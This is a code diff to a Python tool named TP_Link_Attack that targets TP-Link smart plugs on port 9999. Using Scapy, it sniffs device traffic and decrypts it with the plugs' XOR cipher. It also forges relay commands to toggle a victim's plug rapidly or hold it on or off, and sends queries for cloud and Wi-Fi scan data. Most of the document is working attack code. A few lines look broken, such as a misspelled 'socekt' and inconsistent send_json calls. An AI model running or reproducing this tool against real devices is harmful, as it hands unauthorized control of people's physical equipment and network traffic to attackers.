@@ -45,31 +45,39 @@ class Spinner:
 
 class TP_Link_Attack():
   victim_port = 9999
-  victim_id = "ffffffff-ffff-ffff-ffff-ffffffffffff"
+  #victim_id = "ffffffff-ffff-ffff-ffff-ffffffffffff"
   iface= None
-  on_cmd = None
-  off_cmd = None
   repeat = False
+
+  commands = {
+    'on': '{"system":{"set_relay_state":{"state":1}}}',
+    'off': '{"system":{"set_relay_state":{"state":0}}}',
+    'cnCloud': '{"cnCloud":{"get_info":{}}}',
+    'netif': '{"netif":{"get_scaninfo":{}}}',
+  }
 
 
   # @param iface  Network interface of attacker.
   def __init__(self, iface):
     self.iface = iface
-    self.on_cmd = self.construct_switch_cmd(on=True)
-    self.off_cmd = self.construct_switch_cmd(on=False)
+    #self.on_cmd = self.construct_switch_cmd(on=True)
+    #self.off_cmd = self.construct_switch_cmd(on=False)
 
     signal.signal(signal.SIGINT, self.signal_handler)
     
 
   def signal_handler(self, sig, frame):
-    self.repeat = False
+    if not self.repeat:
+      raise KeyboardInterrupt
+    else:
+      self.repeat = False
 
 
   # Given a plaintext, encrypt it so it can be accepted by the device
   @staticmethod
-  def encrypt(plaintext, initial="00000066"):
+  def encrypt(plaintext):
     iv = 171
-    ciphertext = initial
+    ciphertext = (hex(len(plaintext))[2:]).zfill(8)
 
     for i in range(0, len(plaintext)):
       ciphertext += format((ord(plaintext[i]) ^ iv), 'x')
@@ -95,6 +103,7 @@ class TP_Link_Attack():
 
 
   # Constructs a valid switch JSON command. 
+  # NOTE: UNNECESSARY
   def construct_switch_cmd(self, on=False):
     return "{\"context\":{\"source\":\"" + \
         self.victim_id + \
@@ -117,12 +126,12 @@ class TP_Link_Attack():
       s.connect((ip, self.victim_port))
       ss = StreamSocket(s)
 
-      #ss.send(Raw(payload))
+      ss.send(Raw(payload))
 
       # Get status report
-      #pkt = ss.sniff(iface=self.iface, timeout=timeout, count=1, filter="tcp[tcpflags] & tcp-push != 0")
+      pkt = ss.sniff(iface=self.iface, timeout=timeout, count=1, filter="tcp[tcpflags] & tcp-push != 0")
 
-      pkt = ss.sr1(Raw(payload), iface=self.iface, timeout=timeout, filter="tcp[tcpflags] & tcp-push != 0")
+      #pkt = ss.sr1(Raw(payload), timeout=timeout)
 
     return pkt
 
@@ -137,14 +146,14 @@ class TP_Link_Attack():
     printer = lambda pkt: pkt[IP].src + " -> " + pkt[IP].dst + "\n" + self.decrypt(raw(pkt[Raw]).hex()) + "\n"
 
     sniff(iface=self.iface, lfilter=custom_filter, prn=printer)
-
     print("\nSniffing stopped...\n")
+
 
 
   # After 'delay' seconds, send a command that toggles the device
   # (on -> off -> on -> off ...) 
-  # Continious mode: more stable and faster; uses one continious TCP session with the victim
-  def alternating_attack(self, ip, delay=0.5, continious=True):
+  # Continious mode: more stable and faster; uses one continuous TCP session with the victim
+  def alternating_attack(self, ip, delay=0.5, continuous=True):
     toggle = False
     self.repeat = True
 
@@ -152,25 +161,25 @@ class TP_Link_Attack():
     
     with Spinner():
       # Use multiple TCP connections to execute the attack
-      if not continious:
+      if not continuous:
         while self.repeat:
           if toggle:
-            self.send_json(self.on_cmd)
+            self.send_json(self.commands['on'])
           else:
-            self.send_json(self.off_cmd)
+            self.send_json(self.commands['off'])
           toggle = not toggle
 
           sleep(delay)
       else:
-        # Use one continious TCP session to execute the attack
+        # Use one continuous TCP session to execute the attack
         with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
           s.connect((ip, self.victim_port))
           ss = StreamSocket(s)
           while self.repeat:
             if toggle:
-              ss.send(Raw(unhexlify(self.encrypt(self.on_cmd))))
+              ss.send(Raw(unhexlify(self.encrypt(self.commands['on']))))
             else:
-              ss.send(Raw(unhexlify(self.encrypt(self.off_cmd))))
+              ss.send(Raw(unhexlify(self.encrypt(self.commands['off']))))
             toggle = not toggle 
 
             # capture status report from device
@@ -183,10 +192,9 @@ class TP_Link_Attack():
 
   
   # Send commands to the device that makes it maintain its state.
-  # Continious mode: uses one continious TCP connection and sends a command every $delay seconds.
-  # Non-continious mode: wait to resend command when activity happens with device (e.g. notifying app)
-  # NOTE: Non-continious mode may not work if no internet, no app on subnet and device has been manually switched
-  def always_attack(self, ip, on=False, continious=False, delay=0.5):
+  # Continious mode: uses one continuous TCP connection and sends a command every $delay seconds.
+  # Non-continuous mode: wait to resend command when activity happens with device (e.g. notifying app)
+  def always_attack(self, ip, on=False, continuous=False, delay=1):
     # True if packets are related to the victim and that a FIN flag exists (TCP)
     # Helps prevent flooding the network
     fin_filter = lambda pkt: pkt.haslayer(IP) and \
@@ -199,26 +207,28 @@ class TP_Link_Attack():
     print("Starting always attack...")
 
     with Spinner():
-      if not continious:
+      if not continuous:
         while self.repeat:
           if on:
-            self.send_json(self.on_cmd)
+            self.send_json(ip, self.commands['on'])
           else:
-            self.send_json(self.off_cmd)
+            self.send_json(ip, self.commands['off'])
+
+          sleep(delay)
 
           # Wait until someone turned it on or off
-          sniff(iface=self.iface, count=1, timeout=delay, lfilter=fin_filter)
+          #sniff(iface=self.iface, count=1, timeout=delay, lfilter=fin_filter)
       else:
-        # Use one continious TCP session to execute the attack
-        # Sends (on/off) cmd every 0.5 seconds
+        # Use one continuous TCP session to execute the attack
+        # Sends (on/off) cmd every 1 seconds
         with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
           s.connect((ip, self.victim_port))
           ss = StreamSocket(s)
           while self.repeat:
             if on:
-              ss.send(Raw(unhexlify(self.encrypt(self.on_cmd))))
+              ss.send(Raw(unhexlify(self.encrypt(self.commands['on']))))
             else:
-              ss.send(Raw(unhexlify(self.encrypt(self.off_cmd))))
+              ss.send(Raw(unhexlify(self.encrypt(self.commands['off']))))
 
             # capture status report from device
             # RST from device if not used
@@ -248,7 +258,7 @@ class TP_Link_Attack():
         with socket.socket(socekt.AF_INET, socket.SOCK_STREAM) as s:
           s.connect((ip, self.victim_port))
           ss = StreamSocket(s)
-          #reply = ss.sr1(self.on_cmd, iface=self.iface, filter="tcp[tcpflags] & tcp-push != 0")
+          #reply = ss.sr1(self.commands['on'], iface=self.iface, filter="tcp[tcpflags] & tcp-push != 0")
       pass
 
 
